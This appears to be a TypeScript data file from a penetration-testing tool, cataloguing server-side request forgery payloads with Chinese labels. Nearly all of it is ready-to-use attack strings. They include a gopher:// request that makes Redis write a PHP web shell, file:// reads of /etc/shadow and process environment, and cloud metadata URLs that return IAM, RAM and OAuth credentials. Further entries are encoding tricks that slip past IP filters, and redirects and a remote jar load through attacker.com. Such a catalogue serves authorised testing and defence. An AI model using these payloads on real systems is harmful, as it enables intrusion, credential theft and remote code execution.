/**
 * SSRF (服务端请求伪造) Payload 数据集
 * 包含内网 IP、协议利用、云元数据、DNS 重绑定、IP 绕过、重定向等分类
 * 用于渗透测试中的 SSRF 漏洞验证
 */

/** SSRF Payload 数据结构 */
export interface SsrfPayload {
    id: string
    /** 名称 */
    name: string
    /** 实际 Payload 内容 */
    payload: string
    /** 所属分类 */
    category: string
    /** 补充描述 */
    description?: string
    /** 是否属于绕过型 Payload */
    bypass?: boolean
}

/** SSRF 分类定义 */
export interface SsrfCategory {
    id: string
    name: string
    nameEn: string
    payloads: SsrfPayload[]
}

/** 分类元数据 */
export const ssrfCategoryMeta: { id: string; name: string; nameEn: string }[] = [
    { id: "internal_ip", name: "内网 IP", nameEn: "Internal IP" },
    { id: "protocol", name: "协议利用", nameEn: "Protocol" },
    { id: "cloud_metadata", name: "云元数据", nameEn: "Cloud Metadata" },
    { id: "dns_rebind", name: "DNS 重绑定", nameEn: "DNS Rebinding" },
    { id: "ip_bypass", name: "IP 绕过", nameEn: "IP Bypass" },
    { id: "redirect", name: "重定向绕过", nameEn: "Redirect Bypass" },
]

// ============================================================
// 内网 IP (Internal IP)
// ============================================================
const internalIp: SsrfCategory = {
    name: "内网 IP",
    id: "internal_ip",
    nameEn: "Internal IP",
    payloads: [
        // ---- 127.0.0.1 本地回环的各种变体 ----
        { id: "ip-localhost", name: "localhost", payload: `http://localhost/`, category: "internal_ip", description: "最基础的本地回环" },
        { id: "ip-127", name: "127.0.0.1", payload: `http://127.0.0.1/`, category: "internal_ip" },
        { id: "ip-127-port", name: "127.0.0.1:80", payload: `http://127.0.0.1:80/`, category: "internal_ip" },
        { id: "ip-127-port-8080", name: "127.0.0.1:8080", payload: `http://127.0.0.1:8080/`, category: "internal_ip", description: "常见内部服务端口" },
        { id: "ip-127-port-443", name: "127.0.0.1:443", payload: `https://127.0.0.1:443/`, category: "internal_ip" },
        { id: "ip-127-1", name: "127.1", payload: `http://127.1/`, category: "internal_ip", description: "简写形式", bypass: true },
        { id: "ip-127-0-1", name: "127.0.1", payload: `http://127.0.1/`, category: "internal_ip", bypass: true },
        { id: "ip-0", name: "0.0.0.0", payload: `http://0.0.0.0/`, category: "internal_ip", description: "绑定所有接口" },
        { id: "ip-0-short", name: "0", payload: `http://0/`, category: "internal_ip", description: "最短 IP 表示", bypass: true },
        { id: "ip-octal", name: "八进制 127.0.0.1", payload: `http://0177.0.0.1/`, category: "internal_ip", description: "八进制 IP 表示", bypass: true },
        { id: "ip-octal-full", name: "八进制完整", payload: `http://0177.0000.0000.0001/`, category: "internal_ip", bypass: true },
        { id: "ip-hex", name: "十六进制 0x7f000001", payload: `http://0x7f000001/`, category: "internal_ip", description: "十六进制整数 IP", bypass: true },
        { id: "ip-hex-dotted", name: "十六进制点分", payload: `http://0x7f.0x0.0x0.0x1/`, category: "internal_ip", bypass: true },
        { id: "ip-decimal", name: "十进制整数 2130706433", payload: `http://2130706433/`, category: "internal_ip", description: "十进制整数 IP (127.0.0.1)", bypass: true },
        { id: "ip-ipv6-loopback", name: "IPv6 回环 [::1]", payload: `http://[::1]/`, category: "internal_ip", bypass: true },
        { id: "ip-ipv6-full", name: "IPv6 完整回环", payload: `http://[0000:0000:0000:0000:0000:0000:0000:0001]/`, category: "internal_ip", bypass: true },
        { id: "ip-ipv6-mapped", name: "IPv6 映射 127.0.0.1", payload: `http://[::ffff:127.0.0.1]/`, category: "internal_ip", description: "IPv6 映射的 IPv4 地址", bypass: true },
        { id: "ip-ipv6-mapped-hex", name: "IPv6 映射 (十六进制)", payload: `http://[::ffff:7f00:1]/`, category: "internal_ip", bypass: true },
        { id: "ip-ipv6-mapped-0", name: "IPv6 映射 0.0.0.0", payload: `http://[::ffff:0.0.0.0]/`, category: "internal_ip", bypass: true },

        // ---- 内网网段 ----
        { id: "ip-10-1", name: "10.0.0.1", payload: `http://10.0.0.1/`, category: "internal_ip", description: "A 类内网网段" },
        { id: "ip-10-254", name: "10.0.0.254", payload: `http://10.0.0.254/`, category: "internal_ip", description: "常见网关地址" },
        { id: "ip-172-16", name: "172.16.0.1", payload: `http://172.16.0.1/`, category: "internal_ip", description: "B 类内网网段" },
        { id: "ip-192-168-0", name: "192.168.0.1", payload: `http://192.168.0.1/`, category: "internal_ip", description: "C 类内网网段网关" },
        { id: "ip-192-168-1", name: "192.168.1.1", payload: `http://192.168.1.1/`, category: "internal_ip", description: "家庭路由器网关" },
        { id: "ip-169-254", name: "169.254.169.254", payload: `http://169.254.169.254/`, category: "internal_ip", description: "云实例元数据地址" },
    ],
}

// ============================================================
// 协议利用 (Protocol)
// ============================================================
const protocol: SsrfCategory = {
    name: "协议利用",
    id: "protocol",
    nameEn: "Protocol",
    payloads: [
        { id: "proto-file-passwd", name: "file:// 读取 /etc/passwd", payload: `file:///etc/passwd`, category: "protocol", description: "通过 file 协议读取本地文件" },
        { id: "proto-file-shadow", name: "file:// 读取 /etc/shadow", payload: `file:///etc/shadow`, category: "protocol" },
        { id: "proto-file-hosts", name: "file:// 读取 /etc/hosts", payload: `file:///etc/hosts`, category: "protocol" },
        { id: "proto-file-win", name: "file:// 读取 win.ini", payload: `file:///C:/Windows/win.ini`, category: "protocol" },
        { id: "proto-file-proc", name: "file:// 读取 /proc/self/environ", payload: `file:///proc/self/environ`, category: "protocol", description: "读取当前进程环境变量" },
        { id: "proto-gopher-basic", name: "gopher:// 基础", payload: `gopher://127.0.0.1:6379/_INFO`, category: "protocol", description: "Gopher 探测内网 Redis" },
        { id: "proto-gopher-redis", name: "gopher:// Redis 写 WebShell", payload: `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php system($_GET['cmd']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a`, category: "protocol", description: "利用 Gopher 操作 Redis 写 WebShell" },
        { id: "proto-gopher-fastcgi", name: "gopher:// FastCGI RCE", payload: `gopher://127.0.0.1:9000/_`, category: "protocol", description: "Gopher 攻击内网 FastCGI (需构造 FastCGI 请求体)" },
        { id: "proto-gopher-mysql", name: "gopher:// MySQL 未授权", payload: `gopher://127.0.0.1:3306/_`, category: "protocol", description: "Gopher 攻击内网 MySQL 未授权访问" },
        { id: "proto-gopher-smtp", name: "gopher:// SMTP", payload: `gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:<admin@test.com>%0d%0aRCPT%20TO:<victim@test.com>%0d%0aDATA%0d%0aSubject:SSRF%0d%0aTest%0d%0a.%0d%0aQUIT`, category: "protocol", description: "利用 Gopher 发送邮件" },
        { id: "proto-dict", name: "dict:// 协议探测", payload: `dict://127.0.0.1:6379/INFO`, category: "protocol", description: "Dict 协议探测内网 Redis" },
        { id: "proto-dict-port", name: "dict:// 端口扫描", payload: `dict://127.0.0.1:{PORT}/`, category: "protocol", description: "利用 dict 协议探测端口开放" },
        { id: "proto-ftp", name: "ftp:// 内网 FTP", payload: `ftp://127.0.0.1/`, category: "protocol", description: "探测内网 FTP 服务" },
        { id: "proto-tftp", name: "tftp:// 协议", payload: `tftp://127.0.0.1/test`, category: "protocol", description: "TFTP 协议探测" },
        { id: "proto-ldap", name: "ldap:// 协议", payload: `ldap://127.0.0.1/`, category: "protocol", description: "LDAP 协议探测" },
        { id: "proto-sftp", name: "sftp:// 协议", payload: `sftp://attacker.com/`, category: "protocol", description: "SFTP 协议（可获取 SSH banner）" },
        { id: "proto-netdoc", name: "netdoc:// (Java)", payload: `netdoc:///etc/passwd`, category: "protocol", description: "Java netdoc 协议读取文件" },
        { id: "proto-jar", name: "jar:// (Java)", payload: `jar:http://attacker.com/evil.jar!/`, category: "protocol", description: "Java jar 协议远程加载" },
    ],
}

// ============================================================
// 云元数据 (Cloud Metadata)
// ============================================================
const cloudMetadata: SsrfCategory = {
    name: "云元数据",
    id: "cloud_metadata",
    nameEn: "Cloud Metadata",
    payloads: [
        // ---- AWS ----
        { id: "cloud-aws-meta", name: "AWS 元数据入口", payload: `http://169.254.169.254/latest/meta-data/`, category: "cloud_metadata", description: "AWS EC2 实例元数据" },
        { id: "cloud-aws-iam", name: "AWS IAM 角色", payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, category: "cloud_metadata", description: "列出可用的 IAM 角色" },
        { id: "cloud-aws-creds", name: "AWS IAM 凭据", payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}`, category: "cloud_metadata", description: "获取指定角色的临时凭据（AccessKeyId/SecretAccessKey/Token）" },
        { id: "cloud-aws-userdata", name: "AWS 用户数据", payload: `http://169.254.169.254/latest/user-data/`, category: "cloud_metadata", description: "启动脚本中可能包含敏感信息" },
        { id: "cloud-aws-hostname", name: "AWS 主机名", payload: `http://169.254.169.254/latest/meta-data/hostname`, category: "cloud_metadata" },
        { id: "cloud-aws-pubkey", name: "AWS 公钥", payload: `http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key`, category: "cloud_metadata" },
        { id: "cloud-aws-identity", name: "AWS 实例身份文档", payload: `http://169.254.169.254/latest/dynamic/instance-identity/document`, category: "cloud_metadata", description: "实例 ID、区域、账号 ID 等" },
        { id: "cloud-aws-token-v2", name: "AWS IMDSv2 获取 Token", payload: `http://169.254.169.254/latest/api/token`, category: "cloud_metadata", description: "IMDSv2 需先 PUT 获取 Token，再带 Token 访问" },
        { id: "cloud-aws-local-ipv4", name: "AWS 内网 IP", payload: `http://169.254.169.254/latest/meta-data/local-ipv4`, category: "cloud_metadata" },
        { id: "cloud-aws-security-groups", name: "AWS 安全组", payload: `http://169.254.169.254/latest/meta-data/security-groups`, category: "cloud_metadata" },

        // ---- GCP ----
        { id: "cloud-gcp-meta", name: "GCP 元数据入口", payload: `http://metadata.google.internal/computeMetadata/v1/`, category: "cloud_metadata", description: "需要 Metadata-Flavor: Google 请求头" },
        { id: "cloud-gcp-project", name: "GCP 项目 ID", payload: `http://metadata.google.internal/computeMetadata/v1/project/project-id`, category: "cloud_metadata" },
        { id: "cloud-gcp-token", name: "GCP 访问令牌", payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, category: "cloud_metadata", description: "获取 GCP 服务账号 OAuth Token" },
        { id: "cloud-gcp-sa", name: "GCP 服务账号", payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/`, category: "cloud_metadata" },
        { id: "cloud-gcp-kube", name: "GCP Kubernetes token", payload: `http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env`, category: "cloud_metadata", description: "Kubernetes 集群环境变量" },

        // ---- Azure ----
        { id: "cloud-azure-meta", name: "Azure 元数据入口", payload: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, category: "cloud_metadata", description: "需要 Metadata: true 请求头" },
        { id: "cloud-azure-token", name: "Azure 访问令牌", payload: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`, category: "cloud_metadata", description: "获取 Azure Managed Identity Token" },
        { id: "cloud-azure-network", name: "Azure 网络信息", payload: `http://169.254.169.254/metadata/instance/network?api-version=2021-02-01`, category: "cloud_metadata" },

        // ---- DigitalOcean ----
        { id: "cloud-do-meta", name: "DigitalOcean 元数据", payload: `http://169.254.169.254/metadata/v1/`, category: "cloud_metadata", description: "DigitalOcean Droplet 元数据" },
        { id: "cloud-do-hostname", name: "DigitalOcean 主机名", payload: `http://169.254.169.254/metadata/v1/hostname`, category: "cloud_metadata" },
        { id: "cloud-do-id", name: "DigitalOcean 实例 ID", payload: `http://169.254.169.254/metadata/v1/id`, category: "cloud_metadata" },

        // ---- 阿里云 ----
        { id: "cloud-ali-meta", name: "阿里云元数据入口", payload: `http://100.100.100.200/latest/meta-data/`, category: "cloud_metadata", description: "阿里云 ECS 实例元数据" },
        { id: "cloud-ali-ram", name: "阿里云 RAM 角色", payload: `http://100.100.100.200/latest/meta-data/ram/security-credentials/`, category: "cloud_metadata", description: "列出可用的 RAM 角色" },
        { id: "cloud-ali-creds", name: "阿里云 RAM 凭据", payload: `http://100.100.100.200/latest/meta-data/ram/security-credentials/{ROLE_NAME}`, category: "cloud_metadata", description: "获取 RAM 角色临时凭据" },
        { id: "cloud-ali-userdata", name: "阿里云用户数据", payload: `http://100.100.100.200/latest/user-data`, category: "cloud_metadata" },
        { id: "cloud-ali-hostname", name: "阿里云主机名", payload: `http://100.100.100.200/latest/meta-data/hostname`, category: "cloud_metadata" },
        { id: "cloud-ali-region", name: "阿里云区域", payload: `http://100.100.100.200/latest/meta-data/region-id`, category: "cloud_metadata" },
    ],
}

// ============================================================
// DNS 重绑定 (DNS Rebinding)
// ============================================================
const dnsRebind: SsrfCategory = {
    name: "DNS 重绑定",
    id: "dns_rebind",
    nameEn: "DNS Rebinding",
    payloads: [
        {
            id: "dns-rebind-1",
            name: "1u.ms DNS Rebinding",
            payload: `http://make-127-0-0-1-rr.1u.ms/`,
            category: "dns_rebind",
            description: "1u.ms 服务，第一次解析为目标 IP，第二次解析为 127.0.0.1",
            bypass: true,
        },
        {
            id: "dns-rebind-nip",
            name: "nip.io 解析到 127.0.0.1",
            payload: `http://127.0.0.1.nip.io/`,
            category: "dns_rebind",
            description: "nip.io 通配 DNS，域名解析到嵌入的 IP",
            bypass: true,
        },
        {
            id: "dns-rebind-sslip",
            name: "sslip.io 解析到 127.0.0.1",
            payload: `http://127.0.0.1.sslip.io/`,
            category: "dns_rebind",
            bypass: true,
        },
        {
            id: "dns-rebind-nip-10",
            name: "nip.io 解析到 10.0.0.1",
            payload: `http://10.0.0.1.nip.io/`,
            category: "dns_rebind",
            description: "探测内网 10.x 网段",
            bypass: true,
        },
        {
            id: "dns-rebind-nip-192",
            name: "nip.io 解析到 192.168.1.1",
            payload: `http://192.168.1.1.nip.io/`,
            category: "dns_rebind",
            bypass: true,
        },
        {
            id: "dns-rebind-nip-169",
            name: "nip.io 解析到 169.254.169.254",
            payload: `http://169.254.169.254.nip.io/`,
            category: "dns_rebind",
            description: "通过 nip.io 绕过 IP 黑名单访问云元数据",
            bypass: true,
        },
        {
            id: "dns-rebind-custom",
            name: "自定义 DNS Rebinding",
            payload: `http://{YOUR_REBIND_DOMAIN}/`,
            category: "dns_rebind",
            description: "使用 rbndr.us 等服务创建自定义重绑定域名",
            bypass: true,
        },
    ],
}

// ============================================================
// IP 绕过 (IP Bypass)
// ============================================================
const ipBypass: SsrfCategory = {
    name: "IP 绕过",
    id: "ip_bypass",
    nameEn: "IP Bypass",
    payloads: [
        { id: "bypass-at-sign", name: "@ 符号绕过", payload: `http://attacker.com@127.0.0.1/`, category: "ip_bypass", description: "利用 URL 中 @ 前的部分作为用户名", bypass: true },
        { id: "bypass-hash", name: "# 片段绕过", payload: `http://127.0.0.1#@attacker.com/`, category: "ip_bypass", description: "利用 URL fragment 混淆解析", bypass: true },
        { id: "bypass-dot-suffix", name: "域名尾点绕过", payload: `http://127.0.0.1./`, category: "ip_bypass", description: "域名末尾加点号", bypass: true },
        { id: "bypass-enclosed-alpha", name: "Enclosed Alphanumerics", payload: `http://⑫⑦.⓪.⓪.①/`, category: "ip_bypass", description: "使用 Unicode Enclosed Alphanumerics 编码 IP", bypass: true },
        { id: "bypass-octal-mixed", name: "八进制混合", payload: `http://0177.0.0.01/`, category: "ip_bypass", description: "部分八进制混合表示", bypass: true },
        { id: "bypass-hex-overflow", name: "十六进制溢出", payload: `http://0x7f000001/`, category: "ip_bypass", bypass: true },
        { id: "bypass-decimal-127", name: "十进制整数 127.0.0.1", payload: `http://2130706433/`, category: "ip_bypass", bypass: true },
        { id: "bypass-short-127", name: "短 IP 127.1", payload: `http://127.1/`, category: "ip_bypass", bypass: true },
        { id: "bypass-ipv6-bracket", name: "IPv6 方括号", payload: `http://[::1]/`, category: "ip_bypass", bypass: true },
        { id: "bypass-ipv6-mapped-v4", name: "IPv6 映射 IPv4", payload: `http://[::ffff:127.0.0.1]/`, category: "ip_bypass", bypass: true },
        { id: "bypass-ipv6-mapped-dec", name: "IPv6 映射 (十六进制)", payload: `http://[0:0:0:0:0:ffff:7f00:0001]/`, category: "ip_bypass", bypass: true },
        { id: "bypass-url-encoded-ip", name: "URL 编码 IP", payload: `http://%31%32%37%2e%30%2e%30%2e%31/`, category: "ip_bypass", description: "URL 编码 127.0.0.1", bypass: true },
        { id: "bypass-double-url-ip", name: "双重 URL 编码 IP", payload: `http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/`, category: "ip_bypass", bypass: true },
        { id: "bypass-slash-variants", name: "反斜杠绕过", payload: `http://127.0.0.1\\@attacker.com/`, category: "ip_bypass", description: "反斜杠可能被某些解析器忽略", bypass: true },
        { id: "bypass-rare-ip-form", name: "省略零的 IP", payload: `http://127.0.1/`, category: "ip_bypass", description: "省略中间的零段", bypass: true },
        { id: "bypass-protocol-case", name: "协议大小写混合", payload: `hTTp://127.0.0.1/`, category: "ip_bypass", description: "协议部分大小写混合", bypass: true },
        { id: "bypass-tab-char", name: "URL 中嵌入 Tab", payload: `http://127.0.0%091/`, category: "ip_bypass", description: "嵌入制表符绕过正则匹配", bypass: true },
        { id: "bypass-redirect-param", name: "URL 参数中嵌入内网地址", payload: `http://attacker.com/redirect?url=http://127.0.0.1/`, category: "ip_bypass", description: "通过可控重定向参数", bypass: true },
    ],
}

// ============================================================
// 重定向绕过 (Redirect Bypass)
// ============================================================
const redirect: SsrfCategory = {
    name: "重定向绕过",
    id: "redirect",
    nameEn: "Redirect Bypass",
    payloads: [
        {
            id: "redir-302",
            name: "302 重定向到内网",
            payload: `http://attacker.com/302.php?url=http://127.0.0.1/`,
            category: "redirect",
            description: "在攻击者服务器上设置 302 重定向到内网地址",
            bypass: true,
        },
        {
            id: "redir-307",
            name: "307 重定向保留 POST",
            payload: `http://attacker.com/307.php?url=http://127.0.0.1/`,
            category: "redirect",
            description: "307 重定向保留请求方法和请求体",
            bypass: true,
        },
        {
            id: "redir-meta-refresh",
            name: "HTML meta refresh 重定向",
            payload: `http://attacker.com/meta.html`,
            category: "redirect",
            description: "返回 <meta http-equiv='refresh' content='0;url=http://127.0.0.1/'>",
            bypass: true,
        },
        {
            id: "redir-js-location",
            name: "JavaScript 重定向",
            payload: `http://attacker.com/redirect.html`,
            category: "redirect",
            description: "返回 <script>location='http://127.0.0.1/'</script>",
            bypass: true,
        },
        {
            id: "redir-chain",
            name: "多级重定向链",
            payload: `http://attacker.com/r1 → http://attacker.com/r2 → http://127.0.0.1/`,
            category: "redirect",
            description: "通过多级重定向逃避单次 URL 检查",
            bypass: true,
        },
        {
            id: "redir-cloud-meta",
            name: "重定向到云元数据",
            payload: `http://attacker.com/302.php?url=http://169.254.169.254/latest/meta-data/`,
            category: "redirect",
            description: "通过外部 302 重定向访问 AWS 元数据",
            bypass: true,
        },
        {
            id: "redir-shorturl",
            name: "短链接重定向",
            payload: `https://bit.ly/{SHORT_CODE}`,
            category: "redirect",
            description: "使用 URL 短链接服务隐藏真实目标地址",
            bypass: true,
        },
        {
            id: "redir-open-redirect",
            name: "目标应用的开放重定向",
            payload: `http://target.com/redirect?url=http://127.0.0.1/`,
            category: "redirect",
            description: "利用目标应用自身的 Open Redirect 漏洞",
            bypass: true,
        },
    ],
}

/** 所有分类列表 */
export const ssrfCategories: SsrfCategory[] = [
    internalIp,
    protocol,
    cloudMetadata,
    dnsRebind,
    ipBypass,
    redirect,
]

/**
 * 获取所有 Payload 的扁平列表
 */
export function getAllPayloads(): SsrfPayload[] {
    return ssrfCategories.flatMap(c => c.payloads)
}
